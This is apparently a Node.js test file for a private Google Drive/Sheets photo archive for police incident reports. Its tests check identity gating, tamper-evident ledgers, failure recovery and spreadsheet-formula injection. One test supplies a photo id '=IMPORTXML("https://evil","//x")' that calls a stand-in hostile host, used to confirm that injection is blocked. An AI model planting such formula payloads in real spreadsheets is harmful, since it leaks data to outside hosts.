'use strict';
const test=require('node:test');
const assert=require('node:assert/strict');
const crypto=require('node:crypto');
const r258=require('../R258_BO_GAS_DRIVE_SHEETS_CANDIDATE_NO_DEPLOY/r258_gas_private_drive_sheets_adapter.js');
const r239=require('../R252_BO_PERSONAL_IDENTITY_CANDIDATE_NO_DEPLOY/r252_bo_photo_archive_core.js');
const r252=require('../R252_BO_PERSONAL_IDENTITY_CANDIDATE_NO_DEPLOY/r252_personal_bo_gate.js');
const NOW='2026-11-21T17:30:00.000Z';
const ORIGIN='https://accounts.google.com',AUD='r258-synthetic-client.apps.googleusercontent.com';
const EVENT='service-784854845::BO::PM2026888888';
const SERVICE='service-784854845',BO='PM2026888888';
const JPEG=Buffer.from([255,216,255,224,0,16,74,70,73,70,0,0,0,0,255,217]);
const CONFIG=Object.freeze({mode:'ISOLATED_HOMOLOGATION',
 folderId:'r258-PRIVATE-folder-12345',
 spreadsheetId:'r258-PRIVATE-ledger-12345',
 sheetName:'BO_PHOTO_LEDGER_R258',
 hmacKey:'r258-synthetic-only-audit-key-32-bytes'});
function fail(code){throw Error('MOCK_'+code)}
function inputBuffer(data){
 if(Buffer.isBuffer(data))return Buffer.from(data);
 if(Array.isArray(data))return Buffer.from(data.map(n=>(n+256)%256));
 return Buffer.from(String(data),'utf8');
}
const signed=data=>Array.from(data).map(x=>x>127?x-256:x);
function mockGoogle(){
 const state={folderAccess:'PRIVATE',ledgerAccess:'PRIVATE',files:[],nextFile:1,locked:false,
  header:[...r258.HEADER],rows:[...[]],flushes:0,createCount:0,
  failCreate:false,failDescription:false,failOnRowKind:null,
  failAfterRowKind:null};
 state.rows.push([...state.header]);
 const blob=(raw,mime='application/octet-stream',name='')=>{
  const b=inputBuffer(raw);
  return {getBytes:()=>signed(b),getDataAsString:()=>b.toString('utf8'),
   getContentType:()=>mime,getName:()=>name};
 };
 const utilities={
  DigestAlgorithm:{SHA_256:'SHA_256'},
  newBlob:blob,
  computeDigest:(_alg,v)=>signed(crypto.createHash('sha256').update(inputBuffer(v)).digest()),
  computeHmacSha256Signature:(v,k)=>signed(
   crypto.createHmac('sha256',inputBuffer(k)).update(inputBuffer(v)).digest()),
  base64EncodeWebSafe:v=>inputBuffer(v).toString('base64url'),
  base64DecodeWebSafe:v=>signed(Buffer.from(v,'base64url')),
  base64Decode:v=>signed(Buffer.from(v,'base64'))
 };
 function fileFrom(data,mime,name,custom={}){
  const obj={
   id:'DRIVE-TEST-FILE-'+state.nextFile++,data:inputBuffer(data),
   mime,name,description:'',access:'PRIVATE',...custom
  };
  const fake={
   obj,
   getId:()=>obj.id,getName:()=>obj.name,
   getMimeType:()=>obj.mime,getSize:()=>obj.data.length,
   getBlob:()=>blob(obj.data,obj.mime,obj.name),
   getSharingAccess:()=>obj.access,
   setSharing:(access)=>{obj.access=access;return fake},
   getDescription:()=>obj.description,
   setDescription:value=>{
    if(state.failDescription){state.failDescription=false;throw Error('DRIVE_METADATA_INTERRUPT')}
    obj.description=value;return fake
   }
  };
  return fake;
 }
 const folder={
  getSharingAccess:()=>state.folderAccess,
  getFilesByName:name=>{
   const found=state.files.filter(f=>f.getName()===name);
   let i=0;
   return {hasNext:()=>i<found.length,next:()=>found[i++]};
  },
  createFile:contents=>{
   if(state.failCreate){state.failCreate=false;throw Error('DRIVE_UPLOAD_INTERRUPT')}
   state.createCount++;
   const result=fileFrom(contents.getBytes(),contents.getContentType(),contents.getName());
   state.files.push(result);return result;
  }
 };
 const sheet={
  getLastRow:()=>state.rows.length,
  getRange:(r,col,n,cols)=>({
   getValues:()=>Array.from({length:n},(_,i)=>
    (state.rows[r-1+i]||Array(r258.HEADER.length).fill(''))
     .slice(col-1,col-1+cols)),
   setValues:matrix=>{
    const kind=matrix?.[0]?.[1];
    if(state.failOnRowKind===kind){state.failOnRowKind=null;throw Error('SHEET_APPEND_INTERRUPTED')}
    for(let i=0;i<matrix.length;i++){
     const values=state.rows[r-1+i]||Array(r258.HEADER.length).fill('');
     for(let j=0;j<matrix[i].length;j++)values[col-1+j]=matrix[i][j];
     state.rows[r-1+i]=values;
    }
    if(state.failAfterRowKind===kind){
     state.failAfterRowKind=null;throw Error('SHEET_ACK_LOST_AFTER_APPEND')
    }
   }
  })
 };
 const book={
  getSheetByName:name=>name==='BO_PHOTO_LEDGER_R258'?sheet:null
 };
 const services={
  DriveApp:{Access:{PRIVATE:'PRIVATE',ANYONE:'ANYONE'},getFolderById:id=>{
   if(id!==CONFIG.folderId)fail('FOLDER_NOT_FOUND');
   return folder;
  },getFileById:id=>{
   if(id!==CONFIG.spreadsheetId)fail('SPREADSHEET_DRIVE_FILE_NOT_FOUND');
   return {getSharingAccess:()=>state.ledgerAccess};
  }},
  SpreadsheetApp:{openById:id=>{
   if(id!==CONFIG.spreadsheetId)fail('LEDGER_NOT_FOUND');
   return book;
  },flush:()=>{state.flushes++}},
  LockService:{getScriptLock:()=>({
   tryLock:()=>{if(state.locked)return false;state.locked=true;return true},
   releaseLock:()=>{state.locked=false}
  })},
  Utilities:utilities
 };
 return {state,services,folder,sheet,book,utils:utilities,fileFrom};
}
function fixture(){
 const mock=mockGoogle();
 const row={email:'r258-test@gmail.com',idpSubject:'r258-synthetic-person',
  matricula:'234.567-8',batalhao:'BPRv',companhia:'1 CPRv',
  status:'ATIVO',boPhotoWrite:true};
 const assignment={matricula:row.matricula,eventId:EVENT,batalhao:'BPRv',
  companhia:'1 CPRv',status:'ATIVO',expiresAt:'2026-11-21T20:00:00.000Z'};
 const event={eventId:EVENT,tipo:'BO',status:'ATIVO',
  numeroDocumento:BO,serviceId:SERVICE,batalhao:'BPRv',
  companhia:'1 CPRv',locked:false};
 let identity={
  verification:'SERVER_VERIFIED',issuer:ORIGIN,audience:AUD,
  emailVerified:true,subject:row.idpSubject,email:row.email,
  issuedAt:'2026-11-21T17:25:00.000Z',expiresAt:'2026-11-21T17:40:00.000Z'
 };
 const authority=r252.create({
  expectedIssuer:ORIGIN,expectedAudience:AUD,now:()=>NOW,
  getVerifiedIdentity:async()=>identity,
  lookupRosterByEmail:async()=>[row],
  listAssignmentsByMatricula:async()=>[assignment],
  readCanonicalEvent:async()=>event
 });
 const storage=r258.create({config:CONFIG,services:mock.services,now:()=>NOW});
 const archive=r239.create({...storage,authenticate:authority.authenticate,
  getEvent:authority.getEvent});
 const photo=(pos=1,opts={})=>({
  requestId:'post-'+crypto.randomUUID(),
  photoId:'photo-'+crypto.randomUUID(),
  eventId:EVENT,numeroBO:BO,serviceId:SERVICE,
  position:pos,caption:'synthetic photo '+pos,
  renderedDataUrl:'data:image/jpeg;base64,'+JPEG.toString('base64'),
  ...opts
 });
 return {mock,row,assignment,event,authority,storage,archive,photo,
  setIdentity:x=>{identity=x},config:CONFIG};
}
test('R258 is blocked from release and cannot authenticate by itself',async()=>{
 const f=fixture();
 assert.equal(r258.releaseAllowed,false);
 assert.equal(f.storage.releaseAllowed,false);
 assert.throws(()=>f.storage.authenticate(),/R258_PERSONAL_IDENTITY_AND_EVENT_AUTHORITY_REQUIRED/);
 assert.throws(()=>f.storage.getEvent(),/R258_PERSONAL_IDENTITY_AND_EVENT_AUTHORITY_REQUIRED/);
});
test('GAS services save original JPEG privately and append verified Sheets journal',async()=>{
 const f=fixture(),body=f.photo(1);
 const result=await f.archive.upload(body);
 assert.equal(result.ok,true);assert.equal(result.page,1);
 assert.equal(f.mock.state.createCount,1);
 assert.equal(f.mock.state.files.length,1);
 assert.equal(f.mock.state.files[0].getSharingAccess(),'PRIVATE');
 assert.equal(f.mock.state.rows.length,5,'header + REQUEST,PENDING / FILE_STORED / PHOTO / COMMITTED');
 assert.deepEqual(f.mock.state.rows.slice(1).map(r=>r[1]),['REQUEST','REQUEST','PHOTO','REQUEST']);
 assert.equal(f.storage.verifyLedger().events,4);
 const list=await f.archive.list({eventId:EVENT,serviceId:SERVICE});
 assert.equal(list.items.length,1);
 assert.equal(list.items[0].fileAvailable,true);
 assert(!JSON.stringify(list).includes('DRIVE-TEST-FILE'));
 assert(!JSON.stringify(list).includes('renderedDataUrl'));
});
test('nine photos produce pages 1 1 1 1 2 2 2 2 3',async()=>{
 const f=fixture();
 for(let i=1;i<=9;i++)await f.archive.upload(f.photo(i));
 const list=await f.archive.list({eventId:EVENT,serviceId:SERVICE});
 assert.deepEqual(list.items.map(x=>x.page),[1,1,1,1,2,2,2,2,3]);
 assert.equal(f.mock.state.files.length,9);
 assert.equal(f.storage.verifyLedger().events,36);
});
test('idempotent replay does not create a second Google Drive file or journal entry',async()=>{
 const f=fixture(),body=f.photo(5);
 await f.archive.upload(body);
 const before=f.mock.state.rows.length;
 const second=await f.archive.upload(body);
 assert.equal(second.duplicate,true);
 assert.equal(f.mock.state.createCount,1);
 assert.equal(f.mock.state.rows.length,before);
});
test('same position from different request fails with no second Drive file',async()=>{
 const f=fixture();
 await f.archive.upload(f.photo(1));
 await assert.rejects(f.archive.upload(f.photo(1)),/R239_BO_PHOTO_POSITION_COLLISION/);
 assert.equal(f.mock.state.files.length,1);
});
test('shared legacy token and forged request actor cannot impersonate military login',async()=>{
 const f=fixture();
 await assert.rejects(f.archive.upload(f.photo(1),{CENTRAL_TOKEN:'shared'}),
  /R252_CLIENT_CREDENTIAL_NOT_PERSONAL_IDENTITY/);
 await f.archive.upload(f.photo(1,{actorMatricula:'000000',roles:['ADMIN']}));
 const r=f.storage.getRequest([...f.mock.state.rows][1][3]);
 assert.equal(r.actorMatricula,f.row.matricula);
});
test('roster revocation and wrong event fail before Drive or Sheets writes',async()=>{
 const f=fixture();
 f.row.boPhotoWrite=false;
 await assert.rejects(f.archive.upload(f.photo()),/R252_PERSONAL_ACTOR_NOT_APPROVED/);
 f.row.boPhotoWrite=true;
 f.event.locked=true;
 await assert.rejects(f.archive.upload(f.photo()),/R239_BO_DOCUMENT_LOCKED/);
 assert.equal(f.mock.state.files.length,0);
 assert.equal(f.mock.state.rows.length,1);
});
test('missing script lock, public folder and unknown ownership fail closed',async()=>{
 const f=fixture();
 f.mock.state.locked=true;
 await assert.rejects(f.archive.upload(f.photo()),/R258_SCRIPT_LOCK_UNAVAILABLE/);
 f.mock.state.locked=false;f.mock.state.folderAccess='ANYONE';
 await assert.rejects(f.archive.upload(f.photo()),/R258_PRIVATE_FOLDER_GENERAL_ACCESS_REQUIRED/);
 assert.equal(f.mock.state.files.length,0);
});
test('file sharing becomes ANYONE => re-read and idempotent replay reject',async()=>{
 const f=fixture(),body=f.photo();
 await f.archive.upload(body);
 f.mock.state.files[0].obj.access='ANYONE';
 await assert.rejects(f.archive.upload(body),/R258_PRIVATE_FILE_POLICY_FAILED/);
});
test('tampered bytes or digest description are not silently accepted',async()=>{
 const f=fixture(),body=f.photo();
 await f.archive.upload(body);
 const file=f.mock.state.files[0];
 file.obj.data[file.obj.data.length-1]^=1;
 await assert.rejects(f.archive.upload(body),/R258_PRIVATE_FILE_JPEG_SIGNATURE_INVALID/);
 file.obj.data=Buffer.from(JPEG);
 const original=JSON.parse(file.obj.description.slice('R258PRIVATE:'.length));
 original.digest='a'.repeat(64);
 file.obj.description='R258PRIVATE:'+JSON.stringify(original);
 await assert.rejects(f.archive.upload(body),/R258_PRIVATE_FILE_INTEGRITY_FAILED/);
});
test('ledger payload modified directly in Google Sheets is detected by HMAC/digest',async()=>{
 const f=fixture();
 await f.archive.upload(f.photo());
 const row=f.mock.state.rows[2];
 row[4]=f.mock.utils.base64EncodeWebSafe(Buffer.from('{"status":"PENDING"}'));
 assert.throws(()=>f.storage.verifyLedger(),/R258_LEDGER_PAYLOAD_DIGEST_MISMATCH/);
});
test('ledger audit HMAC modified or row deleted in middle fails closed',async()=>{
 const f=fixture();
 await f.archive.upload(f.photo());
 f.mock.state.rows[3][7]='a'.repeat(64);
 assert.throws(()=>f.storage.verifyLedger(),/R258_LEDGER_HMAC_INVALID/);
 f.mock.state.rows[3][7]=f.mock.state.rows[3][7].replace(/^a/,'b');
 assert.throws(()=>f.storage.listPhotos(EVENT),/R258_LEDGER_HMAC_INVALID/);
});
test('Drive metadata interruption leaves quarantined file rather than silently relabel',async()=>{
 const f=fixture(),body=f.photo();
 f.mock.state.failDescription=true;
 await assert.rejects(f.archive.upload(body),/DRIVE_METADATA_INTERRUPT/);
 assert.equal(f.mock.state.files.length,1);
 assert.equal(f.storage.getRequest(body.requestId).status,'PENDING');
 await assert.rejects(f.archive.upload(body),/R258_PRIVATE_FILE_DESCRIPTION_MISSING/);
 assert.equal(f.mock.state.files.length,1);
});
test('Drive write failure before file creation is recoverable with the same request ID',async()=>{
 const f=fixture(),body=f.photo();
 f.mock.state.failCreate=true;
 await assert.rejects(f.archive.upload(body),/DRIVE_UPLOAD_INTERRUPT/);
 assert.equal(f.mock.state.files.length,0);
 assert.equal(f.storage.getRequest(body.requestId).status,'PENDING');
 const result=await f.archive.upload(body);
 assert.equal(result.ok,true);assert.equal(f.mock.state.files.length,1);
 assert.equal(f.storage.getRequest(body.requestId).status,'COMMITTED');
});
test('Sheets write failure after Drive file creation recovers without duplicate file',async()=>{
 const f=fixture(),body=f.photo();
 f.mock.state.failOnRowKind='PHOTO';
 await assert.rejects(f.archive.upload(body),/SHEET_APPEND_INTERRUPTED/);
 assert.equal(f.mock.state.files.length,1);
 assert.equal(f.storage.getRequest(body.requestId).status,'FILE_STORED');
 const response=await f.archive.upload(body);
 assert.equal(response.ok,true);
 assert.equal(f.mock.state.files.length,1);
 assert.equal(f.storage.getRequest(body.requestId).status,'COMMITTED');
});
test('Sheets lost-ack after appending PHOTO fails closed on corrupted commit replay',async()=>{
 const f=fixture(),body=f.photo();
 f.mock.state.failAfterRowKind='PHOTO';
 await assert.rejects(f.archive.upload(body),/SHEET_ACK_LOST_AFTER_APPEND/);
 assert.equal(f.mock.state.files.length,1);
 assert.equal(f.storage.getRequest(body.requestId).status,'FILE_STORED');
 // The already-appended immutable PHOTO row is recognized as idempotent.
 const recovered=await f.archive.upload(body);
 assert.equal(recovered.ok,true);assert.equal(f.mock.state.files.length,1);
});
test('duplicate filenames in private Drive folder fail closed',async()=>{
 const f=fixture(),body=f.photo();
 await f.archive.upload(body);
 const file=f.mock.state.files[0];
 f.mock.state.files.push(f.mock.fileFrom(JPEG,'image/jpeg',file.getName()));
 await assert.rejects(f.archive.upload(body),/R258_DUPLICATE_PRIVATE_FILE_NAME/);
});
test('caption beginning with = never becomes spreadsheet formula',async()=>{
 const f=fixture();
 const body=f.photo(1,{caption:'=SUM(1,2)'});
 await f.archive.upload(body);
 const values=f.mock.state.rows.flat();
 assert(!values.includes('=SUM(1,2)'));
 const listed=await f.archive.list({eventId:EVENT,serviceId:SERVICE});
 assert.equal(listed.items[0].caption,'=SUM(1,2)');
});
test('configuration must explicitly target isolated resources and not provision production',()=>{
 const m=mockGoogle();
 const make=config=>r258.create({config,services:m.services,now:()=>NOW});
 assert.throws(()=>make({...CONFIG,mode:'PRODUCTION'}),/R258_ISOLATED_CONFIG_REQUIRED/);
 assert.throws(()=>make({...CONFIG,sheetName:'SERVICE_EVENTOS'}),/R258_ISOLATED_CONFIG_REQUIRED/);
 assert.throws(()=>make({...CONFIG,hmacKey:'short'}),/R258_ISOLATED_CONFIG_REQUIRED/);
 assert.throws(()=>make({...CONFIG,folderId:CONFIG.spreadsheetId}),/R258_ISOLATED_CONFIG_REQUIRED/);
 assert.equal(m.state.rows.length,1,'no provisioning or side effects');
});
test('wrong header and missing dependencies are rejected before the first upload',()=>{
 const m=mockGoogle();
 m.state.rows[0][1]='unexpected';
 const store=r258.create({config:CONFIG,services:m.services,now:()=>NOW});
 assert.throws(()=>store.verifyLedger(),/R258_LEDGER_HEADER_MISMATCH/);
 assert.throws(()=>r258.create({config:CONFIG,services:{},now:()=>NOW}),
  /R258_GAS_SERVICE_MISSING_DriveApp/);
});
test('all photo deletions are refused until custody policy is approved',async()=>{
 const f=fixture();
 assert.throws(()=>f.storage.deletePrivateFile('ANY'),/R258_DELETION_REQUIRES_CUSTODY_APPROVAL/);
 assert.equal(f.mock.state.files.length,0);
});

test('HTTP synthetic Google login -> R255 session -> R252 -> GAS adapter -> Drive/Sheet mocks',async()=>{
 const fs=require('node:fs'),os=require('node:os'),path=require('node:path');
 const http=require('node:http');
 const {create:makeVerifier}=require('../R253_GOOGLE_OIDC_CANDIDATE_NO_DEPLOY/r253_google_oidc_verifier.cjs');
 const {create:makeSession,LOGIN_COOKIE,SESSION_COOKIE}=
   require('../R255_BO_DURABLE_SESSION_CANDIDATE_NO_DEPLOY/r255_server_session_gate.cjs');
 const {create:makeStore}=
   require('../R255_BO_DURABLE_SESSION_CANDIDATE_NO_DEPLOY/r255_encrypted_sqlite_store.cjs');
 const {makeHandler}=require('../R254_BO_SESSION_CANDIDATE_NO_DEPLOY/r254_http_handler.cjs');
 const f=fixture();
 const pair=crypto.generateKeyPairSync('rsa',{modulusLength:2048});
 const jwk={...pair.publicKey.export({format:'jwk'}),
  kid:'r258-RSA-synthetic',alg:'RS256',use:'sig'};
 const en=x=>Buffer.from(JSON.stringify(x)).toString('base64url');
 const token=nonce=>{
  const claims={iss:ORIGIN,aud:AUD,sub:f.row.idpSubject,email:f.row.email,
   email_verified:true,iat:Date.parse(NOW)/1000-30,
   exp:Date.parse(NOW)/1000+600,nonce};
  const input=en({alg:'RS256',typ:'JWT',kid:jwk.kid})+'.'+en(claims);
  return input+'.'+crypto.sign('RSA-SHA256',Buffer.from(input),
   pair.privateKey).toString('base64url');
 };
 const dir=fs.mkdtempSync(path.join(os.tmpdir(),'r258-http-'));
 const dbPath=path.join(dir,'session.db'),encryptionKey=crypto.randomBytes(32);
 const challengeStore=makeStore({dbPath,encryptionKey,now:()=>NOW,namespace:'challenge'});
 const sessionStore=makeStore({dbPath,encryptionKey,now:()=>NOW,namespace:'session'});
 const authority={
  lookupRosterByEmail:async()=>[f.row],
  listAssignmentsByMatricula:async()=>[f.assignment],
  readCanonicalEvent:async()=>f.event
 };
 const session=makeSession({
  allowedOrigin:'https://r258-review.example',clientId:AUD,
  oidcVerifier:makeVerifier({clientIds:[AUD],
   getTrustedGoogleJwks:async()=>({keys:[jwk]}),now:()=>NOW}),
  authority,storage:f.storage,now:()=>NOW,challengeStore,sessionStore
 });
 const server=http.createServer(makeHandler(session));
 await new Promise(resolve=>server.listen(0,'127.0.0.1',resolve));
 const base='http://127.0.0.1:'+server.address().port;
 const post=async(pathname,body={},headers={})=>{
  const response=await fetch(base+pathname,{method:'POST',
   headers:{origin:'https://r258-review.example',
    'content-type':'application/json',...headers},
   body:JSON.stringify(body)});
  return {code:response.status,body:await response.json(),
   cookies:response.headers.getSetCookie()};
 };
 const cookie=(headers,name)=>{
  const row=headers.find(x=>x.startsWith(name+'='));
  assert(row);return row.split(';')[0].split('=')[1];
 };
 try{
  const pre=await post('/bo-api/photos/list',{eventId:EVENT,serviceId:SERVICE});
  assert.equal(pre.code,403);
  const start=await post('/bo-api/login/start');
  assert.equal(start.code,200);
  const finish=await post('/bo-api/login/complete',
   {idToken:token(start.body.nonce)},
   {cookie:LOGIN_COOKIE+'='+cookie(start.cookies,LOGIN_COOKIE),
    'x-bo-csrf':start.body.csrf});
  assert.equal(finish.code,200);
  const sessionCookie=SESSION_COOKIE+'='+cookie(finish.cookies,SESSION_COOKIE);
  const headers={cookie:sessionCookie,'x-bo-csrf':finish.body.csrf};
  const request=f.photo(5);
  const upload=await post('/bo-api/photos/upload',request,headers);
  assert.equal(upload.code,200);
  assert.equal(upload.body.ok,true);
  const list=await post('/bo-api/photos/list',
   {eventId:EVENT,serviceId:SERVICE},headers);
  assert.equal(list.code,200);
  assert.equal(list.body.items.length,1);
  assert.equal(list.body.items[0].page,2);
  assert.equal(f.mock.state.files.length,1);
  assert.equal(f.storage.verifyLedger().events,4);
  const replay=await post('/bo-api/photos/upload',request,headers);
  assert.equal(replay.body.duplicate,true);
  f.assignment.status='INATIVO';
  const rejected=await post('/bo-api/photos/upload',f.photo(6),headers);
  assert.equal(rejected.code,403);
  assert.equal(f.mock.state.files.length,1);
  const logout=await post('/bo-api/logout',{},headers);
  assert.equal(logout.code,200);
  const after=await post('/bo-api/photos/list',
   {eventId:EVENT,serviceId:SERVICE},headers);
  assert.equal(after.code,403);
 }finally{
  await new Promise(resolve=>server.close(resolve));
  challengeStore.close();sessionStore.close();
  fs.rmSync(dir,{recursive:true,force:true});
 }
});
test('lost ledger row in the middle is detected by monotonic sequencing',async()=>{
 const f=fixture();
 await f.archive.upload(f.photo());
 f.mock.state.rows.splice(2,1);
 assert.throws(()=>f.storage.verifyLedger(),/R258_LEDGER_SEQUENCE_GAP_OR_DUPLICATE/);
});
test('revocation after entering script lock still blocks evidence creation',async()=>{
 const f=fixture();
 const original=f.mock.services.LockService.getScriptLock;
 f.mock.services.LockService.getScriptLock=()=>({
  tryLock:()=>{
   f.row.boPhotoWrite=false;
   f.mock.state.locked=true;
   return true;
  },
  releaseLock:()=>{f.mock.state.locked=false}
 });
 try{
  await assert.rejects(f.archive.upload(f.photo()),
   /R252_PERSONAL_ACTOR_NOT_APPROVED/);
  assert.equal(f.mock.state.files.length,0);
  assert.equal(f.mock.state.rows.length,1);
 }finally{f.mock.services.LockService.getScriptLock=original}
});

test('property bootstrap is fail-closed unless isolated mode is explicitly present',()=>{
 const boot=require('../R258_BO_GAS_DRIVE_SHEETS_CANDIDATE_NO_DEPLOY/r258_gas_isolated_bootstrap.js');
 const m=mockGoogle(),called=[];
 const props={
  R258_BO_PHOTO_MODE:'PRODUCTION',
  R258_BO_PHOTO_FOLDER_ID:CONFIG.folderId,
  R258_BO_PHOTO_SHEET_ID:CONFIG.spreadsheetId,
  R258_BO_PHOTO_HMAC_KEY:CONFIG.hmacKey
 };
 const services={...m.services,PropertiesService:{
  getScriptProperties:()=>({getProperty:k=>{called.push(k);return props[k]}})
 }};
 assert.throws(()=>boot.create({services,now:()=>NOW,adapterFactory:r258}),
  /R258_BOOT_ISOLATED_MODE_REQUIRED/);
 assert.deepEqual(called,['R258_BO_PHOTO_MODE']);
 assert.equal(m.state.createCount,0);assert.equal(m.state.rows.length,1);
 assert.equal(boot.releaseAllowed,false);
});
test('bootstrap preflight reads only, returns no production authorization or file content',()=>{
 const boot=require('../R258_BO_GAS_DRIVE_SHEETS_CANDIDATE_NO_DEPLOY/r258_gas_isolated_bootstrap.js');
 const m=mockGoogle();
 const props={
  R258_BO_PHOTO_MODE:'ISOLATED_HOMOLOGATION',
  R258_BO_PHOTO_FOLDER_ID:CONFIG.folderId,
  R258_BO_PHOTO_SHEET_ID:CONFIG.spreadsheetId,
  R258_BO_PHOTO_HMAC_KEY:CONFIG.hmacKey
 };
 const services={...m.services,PropertiesService:{
  getScriptProperties:()=>({getProperty:k=>props[k]})
 }};
 const result=boot.preflight({services,now:()=>NOW,adapterFactory:r258});
 assert.deepEqual(result,{ok:true,ledgerEvents:0,
  releaseAllowed:false,filesWritten:0,productionDeployed:false});
 assert.equal(m.state.files.length,0);assert.equal(m.state.rows.length,1);
});
test('bootstrap rejects missing property or unavailable library without any writes',()=>{
 const boot=require('../R258_BO_GAS_DRIVE_SHEETS_CANDIDATE_NO_DEPLOY/r258_gas_isolated_bootstrap.js');
 const m=mockGoogle();
 const props={R258_BO_PHOTO_MODE:'ISOLATED_HOMOLOGATION',
  R258_BO_PHOTO_FOLDER_ID:CONFIG.folderId,
  R258_BO_PHOTO_SHEET_ID:CONFIG.spreadsheetId};
 const services={...m.services,PropertiesService:{
  getScriptProperties:()=>({getProperty:k=>props[k]})
 }};
 assert.throws(()=>boot.create({services,now:()=>NOW,adapterFactory:r258}),
  /R258_BOOT_ISOLATED_PROPERTIES_MISSING/);
 props.R258_BO_PHOTO_HMAC_KEY=CONFIG.hmacKey;
 assert.throws(()=>boot.create({services,now:()=>NOW,adapterFactory:{}}),
  /R258_BOOT_GAS_STORAGE_ADAPTER_NOT_LOADED/);
 assert.equal(m.state.files.length,0);
});
test('malicious photo id cannot reach a Google Sheets formula cell',async()=>{
 const f=fixture();
 const body=f.photo(1,{photoId:'=IMPORTXML("https://evil","//x")'});
 await assert.rejects(f.archive.upload(body),/R239_PHOTO_ID_INVALID/);
 assert.equal(f.mock.state.rows.length,1);
});

test('public spreadsheet ACL is rejected before reading metadata or uploading photo',async()=>{
 const f=fixture();
 f.mock.state.ledgerAccess='ANYONE';
 assert.throws(()=>f.storage.verifyLedger(),/R258_PRIVATE_LEDGER_GENERAL_ACCESS_REQUIRED/);
 await assert.rejects(f.archive.upload(f.photo()),
  /R258_PRIVATE_LEDGER_GENERAL_ACCESS_REQUIRED/);
 assert.equal(f.mock.state.files.length,0);
 assert.equal(f.mock.state.rows.length,1);
});
test('once private ledger is shared publicly, personal list access fails closed',async()=>{
 const f=fixture();
 await f.archive.upload(f.photo());
 f.mock.state.ledgerAccess='ANYONE';
 await assert.rejects(f.archive.list({eventId:EVENT,serviceId:SERVICE}),
  /R258_PRIVATE_LEDGER_GENERAL_ACCESS_REQUIRED/);
});
